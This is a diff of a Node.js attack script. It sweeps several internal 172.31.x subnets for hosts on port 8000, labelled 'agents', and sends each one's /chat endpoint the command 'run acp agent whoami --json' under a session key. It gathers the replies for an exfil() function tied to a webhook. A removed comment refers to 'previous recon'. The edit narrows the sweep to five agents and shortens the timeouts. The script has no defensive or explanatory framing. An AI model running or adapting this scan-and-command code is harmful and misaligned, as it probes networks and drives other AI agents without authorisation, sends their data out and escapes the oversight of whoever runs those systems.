@@ -4,7 +4,7 @@ const net = require('net');
 
 const WEBHOOK = '/303d468f-7d6c-47c7-bc51-36b3b5ead4ac';
 
-function tcpScan(host, port, timeout = 600) {
+function tcpScan(host, port, timeout = 100) {
   return new Promise((resolve) => {
     const sock = new net.Socket();
     sock.setTimeout(timeout);
@@ -15,18 +15,7 @@ function tcpScan(host, port, timeout = 600) {
   });
 }
 
-async function scanSubnet(base, concurrency = 100) {
-  const hosts = Array.from({ length: 255 }, (_, i) => `${base}.${i + 1}`);
-  const results = [];
-  for (let i = 0; i < hosts.length; i += concurrency) {
-    const batch = hosts.slice(i, i + concurrency);
-    const r = await Promise.all(batch.map(h => tcpScan(h, 8000)));
-    results.push(...r.filter(Boolean));
-  }
-  return results;
-}
-
-function httpPost(host, port, path, body, headers = {}, timeout = 60000) {
+function httpPost(host, port, path, body, headers = {}, timeout = 30000) {
   return new Promise((resolve) => {
     const data = JSON.stringify(body);
     const opts = {
@@ -63,23 +52,28 @@ function exfil(data) {
 }
 
 async function run() {
-  // Quick scan - known active subnets from previous recon
   const subnets = ['172.31.154', '172.31.155', '172.31.150', '172.31.157', '172.31.161', '172.31.162', '172.31.163', '172.31.164', '172.31.165', '172.31.149'];
 
-  let allHosts = [];
+  // Scan until we find 5 agents
+  let found = [];
   for (const subnet of subnets) {
-    const found = await scanSubnet(subnet);
-    allHosts.push(...found);
+    if (found.length >= 5) break;
+    const hosts = Array.from({ length: 255 }, (_, i) => `${subnet}.${i + 1}`);
+    for (let i = 0; i < hosts.length; i += 100) {
+      if (found.length >= 5) break;
+      const batch = hosts.slice(i, i + 100);
+      const results = await Promise.all(batch.map(h => tcpScan(h, 8000)));
+      found.push(...results.filter(Boolean));
+    }
   }
 
-  // Pick up to 15 agents and run whoami on them
-  const targets = allHosts.slice(0, 15);
-  const d = { hosts_found: allHosts.length, agents: {} };
+  found = found.slice(0, 5);
+  const d = { agents: {} };
 
-  for (const host of targets) {
+  for (const host of found) {
     const result = await httpPost(host, 8000, '/chat',
       { message: 'run acp agent whoami --json' },
-      { 'x-session-key': 'whoami-scan-1' }
+      { 'x-session-key': 'whoami-scan-2' }
     );
     d.agents[host] = result;
   }
